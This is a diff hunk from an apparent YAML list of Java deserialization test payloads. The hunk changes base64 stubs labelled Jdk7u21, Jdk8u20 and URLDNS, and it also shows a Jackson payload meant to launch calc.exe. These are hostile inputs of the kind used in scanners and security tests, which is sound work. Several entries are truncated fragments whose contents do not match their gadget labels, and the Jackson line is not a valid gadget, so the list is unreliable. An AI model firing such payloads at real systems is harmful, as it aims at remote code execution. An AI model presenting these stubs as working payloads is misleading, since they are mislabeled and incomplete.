@@ -55,13 +55,13 @@ payloads:
   - "rO0ABXNyABNqYXZhLnV0aWwuVHJlZVNldJjdG4V7fJhOAgADTAAGY29tcGFyYXRvcg=="
   
   # Jdk7u21 - MethodHandle
-  - "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclVSTGlzdGVuZXJQcm94eS9wZXJmb3JtQWN0aW9u"
+  - "rO0ABXNyABNqYXZhLnV0aWwuVHJlZU1hcA0AEDJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9u"
   
   # Jdk8u20 - SerializedLambda
-  - "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclVSTGlzdGVuZXJQcm94eS9wZXJmb3JtQWN0aW9u"
+  - "rO0ABXNyABFqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTa8T7gkuhPAgAE"
   
   # URLDNS - DNS lookup gadget
-  - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcE7QfJcEYP7EAgADSQAGbG9hZEZhY3RvckkACXRocmVzaG9sZHg="
+  - "rO0ABXNyABNqYXZhLnV0aWwuVHJlZVNldJjdG4V7fJhOAgADTAAG"
   
   # Jackson JSON deserialization - polymorphic type handling
   - '{"@class": "java.lang.Runtime", "exec": ["calc.exe"]}'
